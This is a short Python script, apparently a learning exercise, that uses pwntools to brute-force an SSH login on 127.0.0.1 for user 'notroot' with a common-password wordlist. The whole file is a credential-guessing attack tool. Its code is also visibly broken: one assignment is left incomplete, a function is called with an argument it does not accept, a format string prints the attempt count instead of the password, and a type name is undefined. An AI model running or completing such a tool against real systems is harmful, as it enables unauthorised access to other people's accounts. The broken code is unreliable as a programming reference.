from pwn import *
from returns.result import Result, Success, Failure
from abc import *

class SSHInterface(ABC):
    @abstractmethod
    def connected(self):
        pass
    @abstractmethod
    def close(self):
        pass

class SSHWrapper(SSHInterface):
    def __init__(self, host, user, password, timeout):
        self.response = ssh(host=host, user=user, password=password, timeout=timeout)
    def connected(self):
        return super().connected()
    def close(self):
        return super().close()

def TryConnect() -> Result[Exception, str]:
    try:
        response = 
        if response.connected():
            response.close()
            return Success("Connected")
    except Exception as exception:
        return Failure(exception)

def OpenFile(fileName:string):
    with open (fileName, "r") as value:
        for value in value:
            value = value.strip("\n")
            yield value

def BruteForce(
        host:string,
        user:string,
        fileName:string):
    attempts = 0
    for password in OpenFile(fileName):
        print(
            "Attempting password: '{}'"
                .format(attempts, password))
        match TryConnect(ssh(host=host, user=user, password=password, timeout=1)):
            case Success(value):
                print(value)
                break
            case Failure(value):
                print(value)
        attempts += 1
    
BruteForce("127.0.0.1","notroot","ssh-common-passwords.txt")